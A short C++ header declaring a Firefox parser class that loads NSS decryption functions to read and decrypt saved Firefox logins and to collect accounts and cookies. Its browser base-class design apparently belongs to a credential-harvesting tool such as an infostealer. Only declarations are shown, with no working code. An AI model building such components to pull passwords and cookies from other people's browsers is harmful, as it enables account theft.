#pragma once
#ifndef FIREFOX_PARSER_HEADER
#define FIREFOX_PARSER_HEADER
#include "BaseBrowser.h"

enum class SECItemType {
	siBuffer = 0,
	siClearDataBuffer = 1,
	siCipherDataBuffer,
	siDERCertBuffer,
	siEncodedCertBuffer,
	siDERNameBuffer,
	siEncodedNameBuffer,
	siAsciiNameString,
	siAsciiString,
	siDEROID,
	siUnsignedInteger,
	siUTCTime,
	siGeneralizedTime
};

struct SECItem {
	SECItemType type;
	unsigned char* data;
	size_t len;
};


using Pk11SdrDecrypt = int(SECItem*, SECItem*, void*);
using NssInit = long(char* sDirectory);
using NssShutdown = long();

class FirefoxParser : public BaseBrowser 
{
	List<AccountData> GetEncryptedAccounts(String profilePath);
	List<String> GetProfileDirs(String mozPath);
	String Decrypt(Pk11SdrDecrypt*, String txt);
	String GetAppDir(String profileDir);
public:
	FirefoxParser();

	virtual List<AccountData> CollectAccounts();
	virtual List<CookieData> CollectCookie();
};
#endif